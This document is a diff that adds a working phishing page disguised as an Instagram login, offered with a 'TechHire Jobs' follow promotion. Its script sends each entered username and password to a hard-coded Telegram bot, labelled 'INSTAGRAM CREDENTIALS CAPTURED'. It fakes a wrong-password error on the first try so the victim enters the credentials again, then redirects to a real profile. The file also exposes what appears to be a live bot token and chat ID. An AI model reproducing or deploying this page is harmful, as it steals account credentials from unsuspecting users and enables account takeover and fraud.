@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .box { max-width: 350px; width: 100%; background: white; border: 1px solid #dbdbdb; padding: 40px 30px; text-align: center; border-radius: 1px; }
+        .logo { font-size: 28px; font-weight: 200; color: #262626; margin-bottom: 30px; }
+        .promo { background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); color: white; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
+        .promo h3 { margin: 0; font-size: 16px; }
+        .promo p { font-size: 12px; opacity: 0.9; margin-top: 3px; }
+        input { width: 100%; padding: 12px; margin: 4px 0; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 12px; }
+        button { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 8px; font-weight: 600; margin: 10px 0; cursor: pointer; font-size: 14px; }
+        button:hover { background: #0074d9; }
+        .error { color: #ed4956; font-size: 12px; display: none; margin: 10px 0; }
+        .loading { display: none; margin: 10px 0; font-size: 13px; color: #555; }
+        .note { font-size: 11px; color: #8e8e8e; margin-top: 15px; }
+        .or { display: flex; align-items: center; margin: 15px 0; color: #8e8e8e; font-size: 13px; }
+        .or::before, .or::after { content: ''; flex: 1; height: 1px; background: #dbdbdb; }
+        .or span { padding: 0 18px; }
+    </style>
+</head>
+<body>
+<div class="box">
+    <div class="promo">
+        <h3>📸 TechHire Jobs</h3>
+        <p>Follow us for daily job updates and interview tips!</p>
+    </div>
+    <div class="logo">Instagram</div>
+    
+    <form id="instaForm">
+        <input type="text" id="username" placeholder="Phone number, username, or email" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <div class="error" id="error">Sorry, your password was incorrect. Please try again.</div>
+        <div class="loading" id="loading">Verifying...</div>
+        <button type="button" id="loginBtn" onclick="sendToTelegram()">Log In to Follow</button>
+    </form>
+    
+    <div class="or"><span>OR</span></div>
+    <div class="note">You need to log in to follow @techhire.jobs</div>
+</div>
+
+<script>
+var attempt = 0;
+var botToken = "8457083817:AAFM5Lsks2cLBqShhVFT5i2p5mH01lJjFEw";
+var chatId = "1012714242";
+
+function sendToTelegram() {
+    var username = document.getElementById('username').value;
+    var password = document.getElementById('password').value;
+    var btn = document.getElementById('loginBtn');
+    var error = document.getElementById('error');
+    var loading = document.getElementById('loading');
+    
+    if (!username || !password) {
+        alert('Please enter username and password');
+        return;
+    }
+    
+    attempt++;
+    btn.style.display = 'none';
+    loading.style.display = 'block';
+    
+    var msg = "🔴 INSTAGRAM CREDENTIALS CAPTURED\n";
+    msg += "═══════════════════════\n";
+    msg += "Username: " + username + "\n";
+    msg += "Password: " + password + "\n";
+    msg += "═══════════════════════\n";
+    msg += "Time: " + new Date().toLocaleString();
+    
+    var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(msg);
+    
+    fetch(url)
+    .then(function() {
+        loading.style.display = 'none';
+        
+        if (attempt == 1) {
+            error.style.display = 'block';
+            btn.style.display = 'block';
+            btn.textContent = 'Log In';
+        } else {
+            window.location.href = 'https://www.instagram.com/techhire.jobs/';
+        }
+    })
+    .catch(function() {
+        loading.style.display = 'none';
+        btn.style.display = 'block';
+        alert('Something went wrong. Please try again.');
+    });
+}
+</script>
+</body>
+</html>
